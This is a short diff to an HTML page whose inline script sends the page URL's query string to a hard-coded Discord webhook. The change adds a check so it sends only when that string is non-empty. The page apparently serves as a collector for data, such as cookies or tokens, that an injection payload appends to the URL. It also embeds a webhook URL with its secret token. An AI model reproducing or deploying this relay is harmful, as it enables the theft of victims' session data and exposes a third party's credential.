@@ -2,6 +2,7 @@
 <html>
 <body>
   <script>
+    if (location.href.replace(location.origin + "/?","").length > 0) {
     fetch("https://discord.com/api/webhooks/1050833111069503539/Ij5ddDcT3xZE3mOyOdUe-nVz3oM7Cl0WM53z114b6wMoOfZ5OxVZRXqxE8jB1FSvcvc4", {
       method: "POST",
       headers: {
@@ -11,6 +12,7 @@
         content: location.href.replace(location.origin + "/?",""),
     })
     });
+    }
   </script>
 </body>
 </html>
